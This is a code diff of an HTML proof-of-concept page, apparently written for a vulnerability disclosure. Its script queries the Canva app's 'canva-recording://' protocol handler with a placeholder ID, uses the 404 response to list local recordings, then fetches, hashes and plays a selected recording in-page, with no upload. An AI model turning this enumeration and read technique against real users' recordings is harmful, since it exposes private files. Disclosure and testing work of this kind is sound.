@@ -6,173 +6,142 @@
     <meta name="referrer" content="no-referrer">
     <meta http-equiv="Content-Security-Policy"
           content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; connect-src canva-recording:; media-src blob:">
-    <title>Owned Canva recording visual validation</title>
+    <title>Canva recording disclosure triage</title>
     <style>
-      body { font: 16px/1.45 system-ui, sans-serif; margin: 2rem; }
-      button { font: inherit; padding: .65rem 1rem; }
-      video { display: block; width: min(100%, 960px); margin: 1rem 0; background: #111; }
-      pre { white-space: pre-wrap; overflow-wrap: anywhere; }
+      :root { color-scheme: dark; font-family: system-ui, sans-serif; }
+      body { margin: 0; padding: 24px; background: #10141a; color: #f3f6fa; }
+      main { max-width: 960px; margin: auto; }
+      button { font: inherit; padding: .65rem 1rem; margin: .25rem .35rem .25rem 0; }
+      #recordings { margin: 1rem 0; }
+      video { display: block; width: 100%; max-height: 540px; margin: 1rem 0;
+        background: #050608; border: 2px solid #7c5cff; object-fit: contain; }
+      pre { white-space: pre-wrap; overflow-wrap: anywhere; padding: 1rem;
+        border: 1px solid #48576a; background: #090d12; }
     </style>
   </head>
   <body>
-    <h1>Owned recording visual validation</h1>
-    <p>
-      This diagnoses the owned recording count without showing names or
-      tokens. It reads and locally hashes a file only when exactly one short,
-      tester-owned WebM exists. On success, it plays that in-memory WebM in
-      this page. It sends and stores nothing anywhere.
-    </p>
-    <button id="run" type="button">Run one owned-recording visual test</button>
-    <video id="player" controls autoplay muted playsinline hidden></video>
-    <pre id="result">Not started</pre>
+    <main>
+      <h1>Canva recording disclosure triage</h1>
+      <p>
+        This page lists current-process recordings without displaying local
+        filenames or capability tokens. It reads and previews only the entry
+        selected by the tester. Nothing is uploaded or persistently stored.
+      </p>
+      <button id="refresh" type="button">List current-process recordings</button>
+      <button id="stop" type="button" hidden>Stop and clear preview</button>
+      <div id="recordings"></div>
+      <video id="player" controls autoplay muted playsinline hidden></video>
+      <pre id="result">Not started</pre>
+    </main>
     <script>
       "use strict";
 
-      const button = document.querySelector("#run");
+      const refreshButton = document.querySelector("#refresh");
+      const stopButton = document.querySelector("#stop");
+      const recordings = document.querySelector("#recordings");
       const player = document.querySelector("#player");
       const result = document.querySelector("#result");
       const base = "canva-recording://app/recording/";
       const missingId = "00000000-0000-0000-0000-000000000000";
       const maxBytes = 32 * 1024 * 1024;
+      const maxEntries = 20;
       const uuid =
         /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
-      let consumed = false;
       let activeObjectUrl = null;
+      let selectable = [];
 
-      function show(state, outcome, extra = {}) {
-        result.textContent = JSON.stringify(
-          {
-            ...state,
-            ...extra,
-            outcome,
-            uploaded: false,
-            playedByPoc: extra.playedByPoc === true,
-            decodedByPoc: extra.decodedByPoc === true,
-            storedByPoc: false,
-          },
-          null,
-          2,
-        );
+      function render(value) {
+        result.textContent = typeof value === "string"
+          ? value
+          : JSON.stringify(value, null, 2);
       }
 
       function safeErrorName(error) {
         const allowed = new Set([
-          "AbortError",
-          "DataError",
-          "EncodingError",
-          "MediaError",
-          "NetworkError",
-          "NotAllowedError",
-          "NotFoundError",
-          "NotSupportedError",
-          "SecurityError",
-          "TypeError",
+          "AbortError", "DataError", "EncodingError", "MediaError",
+          "NetworkError", "NotAllowedError", "NotFoundError",
+          "NotSupportedError", "SecurityError", "TypeError",
         ]);
         return error instanceof Error && allowed.has(error.name)
           ? error.name
           : "UnexpectedError";
       }
 
-      function revokeActiveObjectUrl() {
+      function clearPreview(reason = null) {
         player.pause();
         player.removeAttribute("src");
         player.load();
         player.hidden = true;
+        stopButton.hidden = true;
         if (activeObjectUrl !== null) {
           URL.revokeObjectURL(activeObjectUrl);
           activeObjectUrl = null;
         }
+        if (reason !== null) {
+          render({
+            outcome: "preview-cleared",
+            reason,
+            uploaded: false,
+            storedByPoc: false,
+          });
+        }
       }
 
-      addEventListener("pagehide", revokeActiveObjectUrl, { once: true });
+      function uniqueTokenForEntry(file) {
+        const candidates = new Map();
+        for (const [field, token] of [["id", file.id], ["name", file.name]]) {
+          if (
+            typeof token !== "string" ||
+            token === "__undefined__" ||
+            !uuid.test(token)
+          ) {
+            continue;
+          }
+          const prior = candidates.get(token);
+          candidates.set(token, prior ? `${prior}+${field}` : field);
+        }
+        if (candidates.size !== 1) return null;
+        const [[token, selectedField]] = candidates;
+        return { token, selectedField };
+      }
 
-      button.addEventListener("click", async () => {
-        if (consumed) return;
-        consumed = true;
-        button.disabled = true;
-        result.textContent = "Running one bounded local test…";
+      function setSelectionDisabled(disabled) {
+        for (const button of recordings.querySelectorAll("button")) {
+          button.disabled = disabled;
+        }
+        refreshButton.disabled = disabled;
+      }
+
+      async function readSelected(index) {
+        const entry = selectable[index];
+        if (!entry) return;
+        clearPreview();
+        setSelectionDisabled(true);
+        render(`Reading Recording ${index + 1} locally…`);
 
         const state = {
           origin: location.origin,
-          listStatus: null,
-          listResponseType: null,
-          recordingCount: null,
-          tokenCandidateCount: null,
-          fileReadAttempted: false,
+          selectedRecording: index + 1,
+          listedRecordingCount: selectable.length,
+          fileReadAttempted: true,
+          selectedField: entry.selectedField,
         };
 
         try {
-          const listingResponse = await fetch(base + missingId);
-          state.listStatus = listingResponse.status;
-          state.listResponseType = listingResponse.type;
-          if (listingResponse.status !== 404) {
-            show(state, "unexpected-list-status-no-file-read");
+          const response = await fetch(base + entry.token);
+          state.readStatus = response.status;
+          state.readResponseType = response.type;
+          state.mime = response.headers.get("content-type");
+          if (!response.ok) {
+            render({ ...state, outcome: "selected-recording-not-readable" });
+            return;
+          }
+          if (state.mime !== "video/webm" || !response.body) {
+            render({ ...state, outcome: "unexpected-selected-response" });
             return;
           }
 
-          let listing;
-          try {
-            listing = await listingResponse.json();
-          } catch {
-            show(state, "listing-response-was-not-json");
-            return;
-          }
-          if (!Array.isArray(listing.files)) {
-            show(state, "listing-files-array-missing");
-            return;
-          }
-
-          state.recordingCount = listing.files.length;
-          if (state.recordingCount === 0) {
-            show(state, "empty-list-no-file-read");
-            return;
-          }
-          if (state.recordingCount > 1) {
-            show(state, "multiple-recordings-no-file-read");
-            return;
-          }
-
-          const unique = new Map();
-          for (const file of listing.files) {
-            for (const [field, token] of [["id", file.id], ["name", file.name]]) {
-              if (
-                typeof token !== "string" ||
-                token === "__undefined__" ||
-                !uuid.test(token)
-              ) {
-                continue;
-              }
-              const prior = unique.get(token);
-              unique.set(token, prior ? `${prior}+${field}` : field);
-            }
-          }
-          state.tokenCandidateCount = unique.size;
-          if (unique.size !== 1) {
-            show(state, "one-entry-token-set-not-unique");
-            return;
-          }
-
-          const [[token, selectedField]] = unique;
-          state.fileReadAttempted = true;
-          const recordingResponse = await fetch(base + token);
-          state.selectedField = selectedField;
-          state.readStatus = recordingResponse.status;
-          state.readResponseType = recordingResponse.type;
-          state.mime = recordingResponse.headers.get("content-type");
-          if (!recordingResponse.ok) {
-            show(state, "single-owned-recording-not-readable");
-            return;
-          }
-          if (state.mime !== "video/webm") {
-            show(state, "unexpected-mime-no-body-read");
-            return;
-          }
-          if (!recordingResponse.body) {
-            show(state, "readable-stream-missing");
-            return;
-          }
-
-          const reader = recordingResponse.body.getReader();
+          const reader = response.body.getReader();
           const chunks = [];
           let byteLength = 0;
           for (;;) {
@@ -180,12 +149,14 @@
             if (done) break;
             if (!(value instanceof Uint8Array)) {
               await reader.cancel();
-              show(state, "unexpected-stream-chunk-type");
+              render({ ...state, outcome: "unexpected-stream-chunk-type" });
               return;
             }
             if (byteLength + value.byteLength > maxBytes) {
               await reader.cancel();
-              show(state, "owned-webm-over-32mib-aborted", {
+              render({
+                ...state,
+                outcome: "selected-webm-over-32mib-aborted",
                 byteLengthBeforeAbort: byteLength,
               });
               return;
@@ -194,7 +165,7 @@
             byteLength += value.byteLength;
           }
           if (byteLength === 0) {
-            show(state, "owned-webm-empty");
+            render({ ...state, outcome: "selected-webm-empty" });
             return;
           }
 
@@ -205,44 +176,113 @@
             offset += chunk.byteLength;
           }
           chunks.length = 0;
-          const digestBytes = new Uint8Array(
+          const digest = new Uint8Array(
             await crypto.subtle.digest("SHA-256", bytes),
           );
-          const sha256 = Array.from(digestBytes, (byte) =>
+          const sha256 = Array.from(digest, (byte) =>
             byte.toString(16).padStart(2, "0"),
           ).join("");
 
-          revokeActiveObjectUrl();
-          const inMemoryWebm = new Blob([bytes], { type: "video/webm" });
-          activeObjectUrl = URL.createObjectURL(inMemoryWebm);
+          const blob = new Blob([bytes], { type: "video/webm" });
+          activeObjectUrl = URL.createObjectURL(blob);
           player.src = activeObjectUrl;
           player.hidden = false;
+          stopButton.hidden = false;
+
+          let autoplayStarted = false;
           try {
             await player.play();
-          } catch (error) {
-            revokeActiveObjectUrl();
-            show(state, "single-owned-webm-read-hashed-playback-failed", {
-              byteLength,
-              sha256,
-              errorName: safeErrorName(error),
-            });
+            autoplayStarted = true;
+          } catch {
+            // The visible controls remain available if autoplay is restricted.
+          }
+
+          render({
+            ...state,
+            outcome: "selected-owned-webm-read-and-preview-ready",
+            byteLength,
+            sha256,
+            autoplayStarted,
+            playbackSource: "memory-blob-object-url",
+            uploaded: false,
+            storedByPoc: false,
+          });
+        } catch (error) {
+          clearPreview();
+          render({
+            ...state,
+            outcome: "selected-request-failed",
+            errorName: safeErrorName(error),
+          });
+        } finally {
+          setSelectionDisabled(false);
+        }
+      }
+
+      async function refreshList() {
+        clearPreview();
+        selectable = [];
+        recordings.replaceChildren();
+        refreshButton.disabled = true;
+        render("Reading the local recording index…");
+
+        try {
+          const response = await fetch(base + missingId);
+          const listState = {
+            origin: location.origin,
+            listStatus: response.status,
+            listResponseType: response.type,
+            fileReadAttempted: false,
+          };
+          if (response.status !== 404) {
+            render({ ...listState, outcome: "unexpected-list-status" });
+            return;
+          }
+          const listing = await response.json();
+          if (!Array.isArray(listing.files)) {
+            render({ ...listState, outcome: "listing-files-array-missing" });
             return;
           }
 
-          show(state, "single-owned-webm-read-hashed-and-played", {
-            byteLength,
-            sha256,
-            playbackSource: "memory-blob-object-url",
-            playedByPoc: true,
-            decodedByPoc: true,
+          const inspected = listing.files.slice(0, maxEntries);
+          for (const file of inspected) {
+            const entry = uniqueTokenForEntry(file);
+            if (entry !== null) selectable.push(entry);
+          }
+
+          selectable.forEach((entry, index) => {
+            const button = document.createElement("button");
+            button.type = "button";
+            button.textContent = `Play Recording ${index + 1}`;
+            button.addEventListener("click", () => readSelected(index));
+            recordings.append(button);
+          });
+
+          render({
+            ...listState,
+            outcome: "recording-list-ready",
+            recordingCount: listing.files.length,
+            inspectedCount: inspected.length,
+            selectableCount: selectable.length,
+            displayedIdentifiers: false,
+            uploaded: false,
+            storedByPoc: false,
           });
         } catch (error) {
-          revokeActiveObjectUrl();
-          show(state, "request-failed", {
+          render({
+            origin: location.origin,
+            outcome: "listing-request-failed",
             errorName: safeErrorName(error),
+            fileReadAttempted: false,
           });
+        } finally {
+          refreshButton.disabled = false;
         }
-      });
+      }
+
+      refreshButton.addEventListener("click", refreshList);
+      stopButton.addEventListener("click", () => clearPreview("manual"));
+      addEventListener("pagehide", () => clearPreview(), { once: true });
     </script>
   </body>
 </html>
